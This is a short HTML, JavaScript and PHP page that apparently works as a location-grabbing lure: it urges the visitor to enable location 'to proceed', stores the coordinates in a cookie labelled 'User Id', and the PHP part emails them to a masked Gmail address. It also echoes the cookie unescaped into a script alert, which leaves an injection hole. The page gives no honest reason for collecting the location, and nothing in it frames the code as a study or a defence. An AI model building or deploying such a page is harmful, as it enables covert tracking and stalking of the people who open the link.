<!DOCTYPE html>
<html>
  <p id="demo"></p>
  <p>Click here to continue  (Please make sure Location is enabled to proceed)</p>
  <button onclick="myFunction()">Click me</button>
  <p id="loc"></p>
<script>
  if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(successFunction, errorFunction);}
      function successFunction(position) {
      localStorage['authorizedGeoLocation'] = 1;
    }
  function errorFunction(){
      localStorage['authorizedGeoLocation'] = 0;
      }
  function checkauthorizedGeoLocation(){
      if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(successFunction, errorFunction);
      }
      if(typeof localStorage['authorizedGeoLocation'] == "undefined" || localStorage['authorizedGeoLocation'] == "0" ) {
          return false;
        }
      else {
            return true;}
      }
      var x = document.getElementById("demo");
      if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
          }
      else {
            x.innerHTML = "Geolocation is not supported by this browser.";
          }
      function showPosition(position) {
            x.innerHTML = "User Id: "+position.coords.latitude + "-" + position.coords.longitude;
            document.cookie = "data="+x.innerHTML ;
          }
      function myFunction() {
            if(checkauthorizedGeoLocation()== true){
              window.location.href = "incase.php";
            }
            else{
              alert("Please enable location to continue");
              document.getElementById("loc").innerHTML = "Please Enable Location to continue -<br>1. Tap the Lock Icon on Top Left corner of screen<br>2. Then tap Site Settings<br>3. Then select Location Access and enable it<br>4. Refresh<br>";
            }
          }
</script>
</body>
</html>
<?php
  if(isset($_COOKIE['data'])){
      $message = $_COOKIE['data'];
      echo "<script type='text/javascript'>alert('$message');</script>";
      //echo $_COOKIE['data'];
      //echo "<script type='text/javascript'>delete_cookie('data');</script>";
      mail("d*****@gmail.com","My subject",$message);//recievers mail
    }
?>
